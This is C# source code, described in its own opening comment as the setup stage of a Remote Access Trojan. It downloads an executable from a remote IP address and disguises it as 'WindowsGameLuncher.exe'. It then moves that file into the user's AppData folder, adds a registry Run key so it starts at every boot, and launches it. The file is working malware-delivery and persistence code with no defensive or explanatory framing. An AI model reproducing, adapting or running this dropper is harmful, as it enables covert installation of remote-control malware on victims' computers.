// Setup of the client side of the RAT (Remote Access Trojan) application

using System;
using System.IO;
using System.Diagnostics;
using System.Net.Http;
using System.Threading.Tasks;
using Microsoft.Win32;


class ProgramSetup
{

    static void Main()
    {

        DownloadFileAsync("http://192.168.28.230/client.exe", "WindowsGameLuncher.exe")
            .GetAwaiter()
            .GetResult(); // Wait for the download to complete before proceeding

        // 1. Dynamically locate the current user's Local AppData folder
        // This resolves to something like C:\Users\Name\AppData\Local
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        // 2. Define your application's deployment directory name
        string targetDirectory = Path.Combine(localAppData, "WindowsGameLuncher");
        string targetExePath = Path.Combine(targetDirectory, "WindowsGameLuncher.exe");

        // Define where the source file currently is (e.g., the same folder as the setup tool)
        string sourceExePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WindowsGameLuncher.exe");

        try
        {
            // 3. Ensure the target directory exists inside AppData
            if (!Directory.Exists(targetDirectory))
            {
                Directory.CreateDirectory(targetDirectory);
                Console.WriteLine($"[Setup] Created directory: {targetDirectory}");
            }

            // 4. Copy the executable file to the target destination
            // The 'true' parameter allows overwriting the file if an older version exists
            if (File.Exists(sourceExePath))
            {
                if (File.Exists(targetExePath))
                    File.Delete(targetExePath);

                File.Move(sourceExePath, targetExePath);
                Console.WriteLine("[Setup] Application files copied successfully.");
            }
            else
            {
                Console.WriteLine("[Setup Error] Source file 'WindowsGameLuncher.exe' not found in the current directory.");
            }

            // 5. Launch the application from its new location
            Console.WriteLine("[Setup] Launching the application...");
            SetStartup(targetExePath);

            Console.WriteLine("[Setup] Start at boot : " + IsStartupEnabled());

            LaunchApplication(targetExePath);

        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Setup Error] Deployment failed: {ex.Message}");
        }
    }

    // HttpClient is intended to be instantiated once and reused throughout the application life
    private static readonly HttpClient client = new HttpClient();

    public static async Task DownloadFileAsync(string fileUrl, string destinationPath)
    {
        try
        {
            Console.WriteLine($"[Download] Requesting file from: {fileUrl}");

            // 1. Send an HTTP GET request to the file URL
            HttpResponseMessage response = await client.GetAsync(fileUrl);
            
            // 2. Ensure the response indicates success (Status 200 OK)
            response.EnsureSuccessStatusCode();

            // 3. Open a stream to read the incoming file data
            using (Stream remoteStream = await response.Content.ReadAsStreamAsync())
            {
                // 4. Open a local file stream to save the file
                using (FileStream localStream = new FileStream(destinationPath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    // 5. Copy the network stream directly into the local file
                    await remoteStream.CopyToAsync(localStream);
                }
            }

            Console.WriteLine($"[Download] File successfully saved to: {destinationPath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Download Error] Failed to retrieve file: {ex.Message}");
        }
    } 

    private static void LaunchApplication(string exePath)
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = exePath;
        
        // Optional: Sets the working directory to the AppData folder so the game can find its local assets
        startInfo.WorkingDirectory = Path.GetDirectoryName(exePath); 

        using (Process process = Process.Start(startInfo))
        {
            Console.WriteLine($"[Setup] Process started successfully with ID: {process.Id}");
        }
    }

    private const string AppName = "WindowsGameLauncher"; // Unique name for the registry entry

    public static void SetStartup(string pathtoExe)
    {
        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",true))
        {
            key.SetValue(AppName, $"\"{pathtoExe}\"");
        }
    }

    public static bool IsStartupEnabled()
    {
        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
        {
            return key.GetValue(AppName) != null;
        }
    }
}